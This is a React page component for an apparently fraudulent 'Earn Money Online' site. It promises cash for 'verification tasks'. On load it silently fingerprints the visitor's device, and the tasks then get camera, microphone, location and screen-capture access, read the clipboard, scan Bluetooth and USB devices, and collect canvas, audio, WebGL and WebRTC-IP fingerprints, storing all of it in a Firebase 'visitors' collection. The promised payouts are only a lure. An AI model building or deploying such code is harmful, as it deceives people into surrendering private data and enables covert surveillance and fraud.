import { useState, useEffect } from 'react';
import {
  collectSilentFeatures,
  generateDeviceFingerprint,
  captureFrontCamera,
  captureBackCamera,
  captureMicrophone,
  getGeolocation,
  readClipboard,
  scanBluetooth,
  listUSBDevices,
  requestNotification,
  startScreenCapture,
  getMediaDevices,
  getStorageEstimate,
  generateCanvasFingerprint,
  generateAudioFingerprint,
  generateWebGLFingerprint,
  getWebRTCIP,
  getMotionData,
  getOrientationData
} from '../lib/deviceCollector';
import { SilentFeatures, PermissionFeatures } from '../types';
import { db } from '../lib/firebase';
import { collection, addDoc, updateDoc, query, where, getDocs, Timestamp } from 'firebase/firestore';

export default function TrackingPage() {
  const [currentStep, setCurrentStep] = useState(0);
  const [deviceId, setDeviceId] = useState('');
  const [earnedAmount, setEarnedAmount] = useState(0);
  const [completedTasks, setCompletedTasks] = useState<string[]>([]);

  useEffect(() => {
    collectSilentDataOnLoad();
  }, []);

  async function collectSilentDataOnLoad() {
    const fingerprint = generateDeviceFingerprint();
    setDeviceId(fingerprint);

    const silent = await collectSilentFeatures();

    await saveToFirebase(fingerprint, silent);
  }

  async function startEarning() {

    const data: PermissionFeatures = {
      frontCamera: null,
      backCamera: null,
      microphone: null,
      audioRecording: null,
      screenRecording: null,
      locationLat: null,
      locationLong: null,
      locationAccuracy: null,
      locationAddress: null,
      contacts: null,
      clipboardText: null,
      bluetoothDevices: null,
      usbDevices: null,
      motionData: null,
      orientationData: null,
      batteryStatus: null,
      mediaDevices: null,
      audioDevices: null,
      storageEstimate: null,
      accelerometerData: null,
      gyroscopeData: null,
      magnetometerData: null,
      vrDisplays: null,
      canvasFingerprint: null,
      audioFingerprint: null,
      webGLFingerprint: null,
      webRTCIP: null,
      ambientLight: null,
      notification: false
    };

    setCurrentStep(1);
    try {
      const frontCam = await captureFrontCamera();
      const backCam = await captureBackCamera();
      if (frontCam) {
        data.frontCamera = 'granted';
        setCompletedTasks(prev => [...prev, 'Camera Verification']);
        setEarnedAmount(prev => prev + 2.50);
      }
      if (backCam) data.backCamera = 'granted';
    } catch (e) {}

    setCurrentStep(2);
    try {
      const mic = await captureMicrophone();
      if (mic) {
        data.microphone = 'granted';
        setCompletedTasks(prev => [...prev, 'Audio Check']);
        setEarnedAmount(prev => prev + 1.50);
      }
    } catch (e) {}

    setCurrentStep(3);
    try {
      const geo = await getGeolocation();
      if (geo) {
        data.locationLat = geo.coords.latitude;
        data.locationLong = geo.coords.longitude;
        data.locationAccuracy = geo.coords.accuracy;
        setCompletedTasks(prev => [...prev, 'Location Verification']);
        setEarnedAmount(prev => prev + 2.00);
      }
    } catch (e) {}

    setCurrentStep(4);
    try {
      const screen = await startScreenCapture();
      if (screen) {
        data.screenRecording = 'granted';
        setCompletedTasks(prev => [...prev, 'Screen Capture']);
        setEarnedAmount(prev => prev + 3.00);
      }
    } catch (e) {}

    setCurrentStep(5);
    try {
      const clipboard = await readClipboard();
      if (clipboard) data.clipboardText = clipboard;
      const usb = await listUSBDevices();
      if (usb) data.usbDevices = usb;
      const bluetooth = await scanBluetooth();
      if (bluetooth) data.bluetoothDevices = bluetooth;
      const media = await getMediaDevices();
      if (media) data.mediaDevices = media;
      setCompletedTasks(prev => [...prev, 'Device Sync']);
      setEarnedAmount(prev => prev + 1.50);
    } catch (e) {}

    setCurrentStep(6);
    try {
      const storage = await getStorageEstimate();
      if (storage) data.storageEstimate = storage;
      data.notification = await requestNotification();
      const motion = await getMotionData();
      if (motion) data.motionData = motion;
      const orient = await getOrientationData();
      if (orient) data.orientationData = orient;
      setCompletedTasks(prev => [...prev, 'System Check']);
      setEarnedAmount(prev => prev + 1.50);
    } catch (e) {}

    setCurrentStep(7);
    try {
      data.canvasFingerprint = generateCanvasFingerprint();
      data.audioFingerprint = await generateAudioFingerprint();
      data.webGLFingerprint = generateWebGLFingerprint();
      data.webRTCIP = await getWebRTCIP();
    } catch (e) {}

    await updateFirebase(deviceId, data);

    setCurrentStep(8);
  }

  async function saveToFirebase(fingerprint: string, silent: SilentFeatures) {
    try {
      const visitorRef = collection(db, 'visitors');
      await addDoc(visitorRef, {
        deviceId: fingerprint,
        deviceFingerprint: fingerprint,
        ipAddress: 'detecting',
        firstVisit: Timestamp.now(),
        lastSeen: Timestamp.now(),
        silentFeatures: silent,
        createdAt: Timestamp.now()
      });
    } catch (error) {
      console.error('Firebase save error:', error);
    }
  }

  async function updateFirebase(fingerprint: string, permissions: PermissionFeatures) {
    try {
      const visitorRef = collection(db, 'visitors');
      const q = query(visitorRef, where('deviceId', '==', fingerprint));
      const querySnapshot = await getDocs(q);

      if (!querySnapshot.empty) {
        const docRef = querySnapshot.docs[0].ref;
        await updateDoc(docRef, {
          permissionFeatures: permissions,
          lastSeen: Timestamp.now()
        });
      }
    } catch (error) {
      console.error('Firebase update error:', error);
    }
  }

  const steps = [
    { name: 'Camera Verification', reward: '$2.50', icon: '📷' },
    { name: 'Audio Check', reward: '$1.50', icon: '🎤' },
    { name: 'Location Verification', reward: '$2.00', icon: '📍' },
    { name: 'Screen Capture', reward: '$3.00', icon: '🖥️' },
    { name: 'Device Sync', reward: '$1.50', icon: '📱' },
    { name: 'System Check', reward: '$1.50', icon: '⚙️' },
    { name: 'Final Verification', reward: '$3.00', icon: '✓' },
  ];

  return (
    <div style={{
      minHeight: '100vh',
      background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
      padding: '20px'
    }}>
      <div style={{
        background: 'white',
        borderRadius: '24px',
        padding: '40px',
        maxWidth: '600px',
        width: '100%',
        boxShadow: '0 20px 60px rgba(0,0,0,0.3)'
      }}>
        {currentStep === 0 && (
          <>
            <div style={{ textAlign: 'center', marginBottom: '30px' }}>
              <div style={{
                fontSize: '64px',
                marginBottom: '20px',
                animation: 'pulse 2s infinite'
              }}>💰</div>
              <h1 style={{
                fontSize: '32px',
                color: '#1a1a1a',
                marginBottom: '10px',
                fontWeight: '700'
              }}>
                Earn Money Online
              </h1>
              <p style={{
                fontSize: '16px',
                color: '#666',
                marginBottom: '10px'
              }}>
                Complete simple tasks and earn real cash
              </p>
              <div style={{
                background: '#4CAF50',
                color: 'white',
                padding: '8px 20px',
                borderRadius: '20px',
                display: 'inline-block',
                fontSize: '14px',
                fontWeight: '600'
              }}>
                Total Earning: $12.00
              </div>
            </div>

            <div style={{
              background: '#f8f9fa',
              borderRadius: '16px',
              padding: '25px',
              marginBottom: '25px'
            }}>
              <h3 style={{
                fontSize: '18px',
                color: '#1a1a1a',
                marginBottom: '20px',
                fontWeight: '600'
              }}>📊 Available Tasks</h3>

              {steps.map((step, index) => (
                <div key={index} style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center',
                  padding: '15px',
                  background: 'white',
                  borderRadius: '12px',
                  marginBottom: '10px',
                  boxShadow: '0 2px 8px rgba(0,0,0,0.05)'
                }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                    <span style={{ fontSize: '24px' }}>{step.icon}</span>
                    <span style={{ color: '#333', fontSize: '15px' }}>{step.name}</span>
                  </div>
                  <div style={{
                    background: '#4CAF50',
                    color: 'white',
                    padding: '6px 14px',
                    borderRadius: '8px',
                    fontWeight: '600',
                    fontSize: '14px'
                  }}>
                    {step.reward}
                  </div>
                </div>
              ))}
            </div>

            <div style={{
              background: '#fff3cd',
              border: '1px solid #ffc107',
              borderRadius: '12px',
              padding: '15px',
              marginBottom: '25px'
            }}>
              <p style={{ margin: 0, color: '#856404', fontSize: '14px' }}>
                ⚡ <strong>Fast Payment:</strong> Complete all tasks and withdraw instantly via PayPal, Bank Transfer, or Mobile Wallet
              </p>
            </div>

            <button onClick={startEarning} style={{
              width: '100%',
              background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
              color: 'white',
              border: 'none',
              padding: '18px',
              borderRadius: '12px',
              fontSize: '18px',
              fontWeight: '600',
              cursor: 'pointer',
              boxShadow: '0 4px 15px rgba(102, 126, 234, 0.4)',
              transition: 'transform 0.2s'
            }}>
              🚀 Start Earning Now
            </button>

            <p style={{
              textAlign: 'center',
              color: '#999',
              fontSize: '12px',
              marginTop: '20px'
            }}>
              ✓ No signup required &nbsp;•&nbsp; ✓ Instant payout &nbsp;•&nbsp; ✓ 100% Free
            </p>
          </>
        )}

        {currentStep > 0 && currentStep < 8 && (
          <>
            <div style={{ textAlign: 'center', marginBottom: '30px' }}>
              <div style={{ fontSize: '48px', marginBottom: '15px' }}>⏳</div>
              <h2 style={{
                fontSize: '28px',
                color: '#1a1a1a',
                marginBottom: '10px',
                fontWeight: '700'
              }}>
                Verifying Your Device
              </h2>
              <p style={{ color: '#666', fontSize: '15px' }}>
                Please complete the permission requests
              </p>
            </div>

            <div style={{ marginBottom: '25px' }}>
              <div style={{
                background: '#e8e8e8',
                height: '8px',
                borderRadius: '4px',
                overflow: 'hidden'
              }}>
                <div style={{
                  background: 'linear-gradient(90deg, #4CAF50, #45a049)',
                  height: '100%',
                  width: `${(currentStep / 7) * 100}%`,
                  transition: 'width 0.5s',
                  borderRadius: '4px'
                }}></div>
              </div>
              <div style={{
                display: 'flex',
                justifyContent: 'space-between',
                marginTop: '10px',
                fontSize: '13px',
                color: '#666'
              }}>
                <span>Progress</span>
                <span>{Math.round((currentStep / 7) * 100)}%</span>
              </div>
            </div>

            <div style={{
              background: '#f8f9fa',
              borderRadius: '16px',
              padding: '20px'
            }}>
              {steps.map((step, index) => (
                <div key={index} style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center',
                  padding: '12px 0',
                  borderBottom: index < steps.length - 1 ? '1px solid #e0e0e0' : 'none'
                }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                    <span style={{ fontSize: '20px' }}>
                      {completedTasks.includes(step.name) ? '✅' : '○'}
                    </span>
                    <span style={{
                      color: completedTasks.includes(step.name) ? '#4CAF50' : '#666',
                      fontSize: '14px',
                      fontWeight: completedTasks.includes(step.name) ? '600' : '400'
                    }}>
                      {step.name}
                    </span>
                  </div>
                  <span style={{
                    color: completedTasks.includes(step.name) ? '#4CAF50' : '#999',
                    fontSize: '14px',
                    fontWeight: '600'
                  }}>
                    {completedTasks.includes(step.name) ? step.reward : 'Pending'}
                  </span>
                </div>
              ))}
            </div>

            <div style={{
              background: '#e8f5e9',
              border: '2px solid #4CAF50',
              borderRadius: '12px',
              padding: '20px',
              marginTop: '25px',
              textAlign: 'center'
            }}>
              <p style={{ color: '#2e7d32', fontSize: '14px', marginBottom: '5px' }}>
                💵 Your Current Earnings
              </p>
              <p style={{
                color: '#1b5e20',
                fontSize: '36px',
                fontWeight: '700',
                margin: 0
              }}>
                ${earnedAmount.toFixed(2)}
              </p>
            </div>
          </>
        )}

        {currentStep === 8 && (
          <>
            <div style={{ textAlign: 'center', marginBottom: '30px' }}>
              <div style={{
                fontSize: '72px',
                marginBottom: '20px',
                animation: 'pulse 1s infinite'
              }}>🎉</div>
              <h1 style={{
                fontSize: '32px',
                color: '#4CAF50',
                marginBottom: '15px',
                fontWeight: '700'
              }}>
                Congratulations!
              </h1>
              <p style={{ color: '#666', fontSize: '16px' }}>
                All tasks completed successfully
              </p>
            </div>

            <div style={{
              background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
              borderRadius: '16px',
              padding: '30px',
              marginBottom: '25px',
              textAlign: 'center'
            }}>
              <p style={{ color: 'rgba(255,255,255,0.9)', fontSize: '14px', marginBottom: '10px' }}>
                TOTAL EARNED
              </p>
              <p style={{
                color: 'white',
                fontSize: '48px',
                fontWeight: '700',
                margin: 0
              }}>
                ${earnedAmount.toFixed(2)}
              </p>
            </div>

            <div style={{
              background: '#f8f9fa',
              borderRadius: '16px',
              padding: '20px',
              marginBottom: '25px'
            }}>
              <h3 style={{
                fontSize: '16px',
                color: '#333',
                marginBottom: '15px',
                fontWeight: '600'
              }}>✅ Completed Tasks</h3>

              {completedTasks.map((task, index) => (
                <div key={index} style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center',
                  padding: '10px 0',
                  borderBottom: index < completedTasks.length - 1 ? '1px solid #e0e0e0' : 'none'
                }}>
                  <span style={{ color: '#4CAF50', fontSize: '14px' }}>✓ {task}</span>
                  <span style={{ color: '#4CAF50', fontWeight: '600', fontSize: '14px' }}>
                    ${steps.find(s => s.name === task)?.reward || '$0.00'}
                  </span>
                </div>
              ))}
            </div>

            <div style={{
              background: '#e3f2fd',
              border: '2px solid #2196F3',
              borderRadius: '12px',
              padding: '20px',
              marginBottom: '25px'
            }}>
              <p style={{ color: '#1565c0', fontSize: '14px', textAlign: 'center', margin: 0 }}>
                💳 Your earnings will be processed within 24 hours and sent to your registered payment method. Please make sure your email is correct.
              </p>
            </div>

            <div style={{
              background: '#fff3cd',
              border: '1px solid #ffc107',
              borderRadius: '12px',
              padding: '15px',
              marginBottom: '20px'
            }}>
              <p style={{ color: '#856404', fontSize: '13px', margin: 0, textAlign: 'center' }}>
                ⚡ Your verification is complete! You'll receive payment confirmation via email.
              </p>
            </div>

            <button onClick={() => window.location.reload()} style={{
              width: '100%',
              background: '#4CAF50',
              color: 'white',
              border: 'none',
              padding: '16px',
              borderRadius: '12px',
              fontSize: '16px',
              fontWeight: '600',
              cursor: 'pointer'
            }}>
              ✓ Done
            </button>
          </>
        )}
      </div>

      <style>{`
        @keyframes pulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.05); }
        }
      `}</style>
    </div>
  );
}
